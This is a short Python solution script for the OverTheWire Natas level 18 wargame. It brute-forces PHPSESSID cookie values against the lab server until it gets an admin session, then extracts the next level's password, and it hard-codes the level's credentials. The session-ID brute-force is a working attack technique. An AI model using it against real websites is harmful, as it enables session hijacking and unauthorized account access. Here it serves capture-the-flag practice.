import requests
import sys,os
import re

cmd = ""
os_name = sys.platform
if os_name == 'win32':
	cmd = "cls"
elif os_name == 'linux' or os_name == 'darwin':
	cmd =  "clear"

username = "natas18"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"

url = "http://%s.natas.labs.overthewire.org"%username
session = requests.Session()
for _id_ in range(1,641):
	print("Trying PHPSESSID:",_id_)
	response = session.post(url , cookies={"PHPSESSID" : str(_id_) }, auth=(username,password))
	content = response.text
	if "You are an admin." in content:
		flag = re.findall("Username: natas19\nPassword: (.*)</pre>",content)[0]
		print("[+] Gotcha " ,flag)
		break
	os.system(cmd)
		





